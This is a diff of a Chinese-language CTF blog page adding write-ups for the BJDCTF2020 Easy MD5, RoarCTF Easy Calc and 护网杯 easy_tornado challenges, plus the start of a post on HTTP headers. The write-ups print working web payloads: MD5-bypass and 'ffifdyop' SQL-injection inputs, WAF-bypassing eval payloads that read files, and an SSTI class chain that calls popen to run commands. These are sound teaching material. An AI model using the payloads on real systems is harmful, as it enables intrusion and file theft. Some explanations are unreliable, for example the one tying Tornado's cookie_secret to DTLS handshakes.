@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 14px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 18px;">脚本编写</a>
+						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16.67px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 18.33px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -234,10 +234,424 @@
 
 
   
-    <article id="post-[ACTF2020 新生赛]Exec(命令执行)" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-[BJDCTF2020]Easy MD5(MD5漏洞)" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/07/16/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/" class="article-date">
+      <a href="/2021/07/17/%5BBJDCTF2020%5DEasy%20MD5(MD5%E6%BC%8F%E6%B4%9E)/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%5BBJDCTF2020%5DEasy%20MD5(MD5%E6%BC%8F%E6%B4%9E)/">
+        Easy MD5
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MD5漏洞"><a href="#MD5漏洞" class="headerlink" title="MD5漏洞"></a>MD5漏洞</h1><h2 id="数字与字符串"><a href="#数字与字符串" class="headerlink" title="数字与字符串"></a>数字与字符串</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(0==&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">var_dump(&#x27;0&#x27;==&#x27;a&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>前者为ture，后者为false。在php中如果在将字符串转换为整型时，前面是数字，后面是字母的字符串，则取字符串的第一个字母前面的数字。</p>
+<p>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(123==&quot;123abc&quot;)&#123;</span><br><span class="line">echo intval(&quot;123abc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="MD5漏洞-1"><a href="#MD5漏洞-1" class="headerlink" title="MD5漏洞"></a>MD5漏洞</h2><h3 id="如果两个MD5的值进行比较时，这两个值的开头都为0E的话，则它们的hash值会被默认为0，那么在php的比较中两个不同数值的MD5的值进行比较时，就会相同"><a href="#如果两个MD5的值进行比较时，这两个值的开头都为0E的话，则它们的hash值会被默认为0，那么在php的比较中两个不同数值的MD5的值进行比较时，就会相同" class="headerlink" title="如果两个MD5的值进行比较时，这两个值的开头都为0E的话，则它们的hash值会被默认为0，那么在php的比较中两个不同数值的MD5的值进行比较时，就会相同"></a>如果两个MD5的值进行比较时，这两个值的开头都为0E的话，则它们的hash值会被默认为0，那么在php的比较中两个不同数值的MD5的值进行比较时，就会相同</h3><p>而hash值开头为0E的数有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">以下值在md5加密后以0E开头：</span><br><span class="line"></span><br><span class="line">    QNKCDZO</span><br><span class="line">    240610708</span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line"></span><br><span class="line">以下值在sha1加密后以0E开头：</span><br><span class="line"></span><br><span class="line">    sha1(‘aaroZmOk’)</span><br><span class="line">    sha1(‘aaK1STfY’)</span><br><span class="line">    sha1(‘aaO8zKZF’)</span><br><span class="line">    sha1(‘aa3OFF9m’)</span><br></pre></td></tr></table></figure>
+
+<h3 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h3><p>在php中===表示不仅比较两个数值，而且还要比较两个数值的类型<br>而在MD5加密中，有一个特性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5([1,2,3])==md5([2,3,4])==null</span><br></pre></td></tr></table></figure>
+<p>因此如果传入的数值时数组，并且对传入的数组还要进行md5加密，则会实现绕过</p>
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(md5($_GET[&#x27;a&#x27;])===md5($_GET[&#x27;b&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">echo &quot;haha&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;ha&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="MD5的碰撞"><a href="#MD5的碰撞" class="headerlink" title="MD5的碰撞"></a>MD5的碰撞</h3><p>虽然两个数值不同，但是经过md5加密后，数值相同，如果是post提交的话，数值要进行urlencode</p>
+<p>下面有两个不同数值的md5相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>通过sql注入的尝试，发现不行，就用dirmap扫描，好像也扫不不出什么东西，就用bp抓包,发现了sql语句</p>
+<p>![BJDCTF2020 Easy MD51](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/[BJDCTF2020]Easy">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/[BJDCTF2020]Easy</a> MD51.jpg)</p>
+<p>通过sql语句中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=&quot;&#x27;&quot;.md5($pass,TRUE).&quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo (&quot;password=&quot;.&quot;&#x27;&quot;.md5($_GET[&#x27;a&#x27;],TRUE).&quot;&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以知道，当输入为ffifdyop，可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;&#x27;or&#x27;6É]™é!r,ùíb&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造了一句万能语句，从而实现绕过</p>
+<p>而后打开页面源码，可以看见一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可知get提交a[]=1&amp;b[]=2，即可实现绕过</p>
+<p>而后又得到了一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>由代码中，我们可以再次使用数组绕过，构造param1[]=1&amp;param2[]=2，且用post提交</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-[RoarCTF 2019]Easy Calc(waf绕过和字符串特性及preg_match绕过）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%5BRoarCTF%202019%5DEasy%20Calc(waf%E7%BB%95%E8%BF%87%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7%E5%8F%8Apreg_match%E7%BB%95%E8%BF%87%EF%BC%89/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%5BRoarCTF%202019%5DEasy%20Calc(waf%E7%BB%95%E8%BF%87%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7%E5%8F%8Apreg_match%E7%BB%95%E8%BF%87%EF%BC%89/">
+        Easy Calc(waf绕过和字符串特性及preg_match绕过）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php字符串特性及waf绕过"><a href="#php字符串特性及waf绕过" class="headerlink" title="php字符串特性及waf绕过"></a>php字符串特性及waf绕过</h1><h2 id="php字符串特性"><a href="#php字符串特性" class="headerlink" title="php字符串特性"></a>php字符串特性</h2><p>php在查询字符串时，会有两个特性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">删除空白格</span><br><span class="line"></span><br><span class="line">将某些字符转换为下划线</span><br></pre></td></tr></table></figure>
+
+<h2 id="waf的绕过"><a href="#waf的绕过" class="headerlink" title="waf的绕过"></a>waf的绕过</h2><p>如果一个waf对一个变量的内容进行了审计，则如果想绕过waf，可以在变量名前面加空格，这样waf就不会将其作为<br>它要审计的变量名，但前提是waf不是php写的，题目是php写的</p>
+<h2 id="scandir-函数"><a href="#scandir-函数" class="headerlink" title="scandir()函数"></a>scandir()函数</h2><p>scandir()函数返回指定目录的文件和目录的数组</p>
+<h2 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h2><p>var_dump()函数显示一个或多个表达式的结构信息，包括表达式的类型和数值</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>通过查看页面源代码，我们可以知道它有一个waf和一个文件calc.php</p>
+<p>我们通过构造/calc.php，得到源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>通过对源代码的审计，发现它对某些字符进行了过滤</p>
+<p>因此，由于可以利用php字符串的特性，在num前面加空格绕过waf，并构造payload来查看flag位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>
+
+<p>可以看见里面有flagg文件，因此我们可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+
+<p>可以得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-[护网杯 2018]easy_tornado(ssti模板注入和tornado模板注入）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado(ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%92%8Ctornado%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado(ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%92%8Ctornado%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/">
+        easy_tornado(ssti模板注入和tornado模板注入）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ssti模板注入和tornado模板注入"><a href="#ssti模板注入和tornado模板注入" class="headerlink" title="ssti模板注入和tornado模板注入"></a>ssti模板注入和tornado模板注入</h1><h2 id="ssti模板和tornado模板注入"><a href="#ssti模板和tornado模板注入" class="headerlink" title="ssti模板和tornado模板注入"></a>ssti模板和tornado模板注入</h2><p>产生模板注入的原因：是因为没有对用户的输入进行相应的检查，过分相信用户的输入导致的，由于在ssti模板和tornado模板中存在render渲染函数和 template渲染函数，因此当用户输入信息时<br>                                render函数和 template函数对输入的信息进行执行，并将结果渲染回页面，此时用户的输入是可控的，而且也没有对输入的信息进行审计，导致可能会出现一些恶意的代码。</p>
+<h3 id="render函数和-template函数"><a href="#render函数和-template函数" class="headerlink" title="render函数和 template函数"></a>render函数和 template函数</h3><p>对里面的信息进行渲染和返回页面</p>
+<p>模板中可能的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">render($_GET[&#x27;msg&#x27;])</span><br><span class="line"></span><br><span class="line">template($_GET[&#x27;msg&#x27;])</span><br></pre></td></tr></table></figure>
+<p>对输入的信息进行执行并渲染回页面</p>
+<h3 id="用户输入恶意信息的格式："><a href="#用户输入恶意信息的格式：" class="headerlink" title="用户输入恶意信息的格式："></a>用户输入恶意信息的格式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.......&#125;&#125;装载一个变量</span><br><span class="line"></span><br><span class="line">&#123;%......%&#125;装载一个控制语句</span><br><span class="line"></span><br><span class="line">&#123;#.......#&#125;渲染时，注释中间的内容</span><br></pre></td></tr></table></figure>
+
+<h2 id="对ssti模板中类的调用"><a href="#对ssti模板中类的调用" class="headerlink" title="对ssti模板中类的调用"></a>对ssti模板中类的调用</h2><p>用空格来知道并调用我们需要的类</p>
+<p>查找模板中的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找模板类中的基类，一般为object类，有时不止一个基类，可以使用mro来显示所有基类，bases也可以显示所有基类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _mro_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找模板类中的基类的子类的集合，[0]是所有基类中的第一个基类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _[0]._ _subclasse_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找模板类中的基类的子类的初始类，并用globals全局来查找所有的方法及变量及参数，()[118]是在模板类中的基类的第119个子类，<a href="'dir'">‘popen’</a>是调用模板类中的基类的第119个子类的初始类的function popen中的dir来打开文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _[0]._ _subclasse_ _()[118]._ _init_ _._ _globals_ _[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;  //打开文件并读取</span><br></pre></td></tr></table></figure>
+
+<h2 id="模板注入可能有些过滤的绕过方法"><a href="#模板注入可能有些过滤的绕过方法" class="headerlink" title="模板注入可能有些过滤的绕过方法"></a>模板注入可能有些过滤的绕过方法</h2><h3 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过[]过滤"></a>绕过[]过滤</h3><p>使用gititem绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原poc &#123;&#123;&quot;&quot;.class.bases[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.class.bases.getitem(0)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤了subclasses，拼凑法"><a href="#过滤了subclasses，拼凑法" class="headerlink" title="过滤了subclasses，拼凑法"></a>过滤了subclasses，拼凑法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原poc&#123;&#123;&quot;&quot;.class.bases[0].subclasses()&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过 &#123;&#123;&quot;&quot;.class.bases[0]&#x27;subcla&#x27;+&#x27;sses&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤了class"><a href="#过滤了class" class="headerlink" title="过滤了class"></a>过滤了class</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[12]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h2><p>tornado模板注入和以上ssti模板注入类似，不过tornado模板中，存在一些可以快速访问的对象，例如：handler.settings(环境变量)</p>
+<p>而cookie_secret就在handler.settings中</p>
+<h2 id="cookie-secret"><a href="#cookie-secret" class="headerlink" title="cookie_secret"></a>cookie_secret</h2><p>是在DTLS握手过程中的生成和需要验证的cookie值</p>
+<p>DTLS协议是对广播发送UDP报文的加密，且可以防止中断攻击，以为在建立握手时，客户端会发送client-hello请求，此时服务器会生成一个cookie值放在Hello-Verify-Request报文中，<br>此时客户端收到后需将收到的cookie值放到client-hello中，并再发送给服务器，服务器收到后对比cookie值，相同才分配资源。</p>
+<h2 id="实例（tornado模板注入）"><a href="#实例（tornado模板注入）" class="headerlink" title="实例（tornado模板注入）"></a>实例（tornado模板注入）</h2><p>打开网页后看到三个文件，分别时flag.txt、welcome.txt和hint.txt，各自打开文件，发现payload有filename&amp;filehash的get的提交方式，有此可知，需要这两个变量都满足变量才能显示文件的内容</p>
+<p>而打开三个文件后发现flag在/flllllllllllag文件下，且有render渲染函数，且知道了filehash的加密方式</p>
+<p>此时需要我们找到cookie_secret值，此时我们在filename中输入flllllllllllag，发现报错，且payload为/error?msg=error，因此我们可以使用tornado模板中，存在一些可以快速访问的对象的特性，来构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时我们得到cookie_secret的值</p>
+<p>然后我们构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo md5(&#x27;f03d04f0-456b-4577-b431-bd29fd3292d2&#x27;.md5(&quot;/fllllllllllllag&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得出fliehash值后代入即可得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-[极客大挑战 2019]Http(http头部）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp(http%E5%A4%B4%E9%83%A8%EF%BC%89/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp(http%E5%A4%B4%E9%83%A8%EF%BC%89/">
+        Http(http头部）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="http头部"><a href="#http头部" class="headerlink" title="http头部"></a>http头部</h1><h2 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h2><p>是header的一部分，是浏览器告诉服务器网页的从哪里来的</p>
+<h2 id="X-Forward-For"><a href="#X-Forward-For" class="headerlink" title="X-Forward-For"></a>X-Forward-For</h2><p>是一个http的扩展头部，用来记录离服务器最远的源ip和中间的代理ip</p>
+<h2 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h2><p>是用户代理，识别用户使用的操作系统及版本、cpu类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件</p>
